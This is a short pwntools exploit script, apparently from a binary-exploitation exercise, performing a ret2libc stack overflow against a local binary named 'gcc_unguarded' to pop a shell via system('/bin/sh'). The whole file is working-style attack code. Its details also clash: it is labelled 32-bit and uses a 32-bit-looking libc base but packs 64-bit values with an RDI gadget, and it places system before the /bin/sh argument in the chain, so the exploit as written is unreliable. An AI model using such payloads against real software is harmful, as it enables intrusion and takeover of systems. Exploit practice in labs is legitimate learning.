# 32-bit
from pwn import *

elf = context.binary = ELF('./bin/gcc_unguarded')
p = process()

libc = elf.libc                        # Simply grab the libc it's running with
libc.address = 0xf7da4000              # Set base address

system = libc.sym['system']            # Grab location of system
binsh = next(libc.search(b'/bin/sh'))  # grab string location

POP_RDI = 0x40115e

payload = b'A' * 72         # The padding
payload += p64(POP_RDI)   # pop rdi; ret
payload += p64(system)      # Location of system
payload += p64(binsh)
payload += p64(0x0)

p.clean()
p.sendline(payload)
p.interactive()